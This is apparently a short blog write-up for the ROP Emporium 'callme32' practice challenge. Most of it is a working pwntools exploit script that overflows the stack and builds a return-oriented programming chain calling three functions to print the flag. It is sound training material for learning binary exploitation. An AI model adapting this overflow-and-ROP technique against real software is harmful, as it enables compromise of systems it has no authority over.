---
layout: post
title: ROP Emporium - callme32
---

### Instruction
You must call callme_one(), callme_two() and callme_three() in that order, each with the arguments 1,2,3 e.g. callme_one(1,2,3) to print the flag.

### Prev step to overflow stack
<https://bhrdn.github.io/ROP-Emporium-ret2win32/>

### Payload
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('callme32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

payload = '\x90' * cyclic_find('laaa')

rop = ROP(exe)
rop.call('callme_one', [1, 2, 3])
rop.call('callme_two', [1, 2, 3])
rop.call('callme_three', [1, 2, 3])

io.sendline(payload + rop.__str__())
io.interactive()
```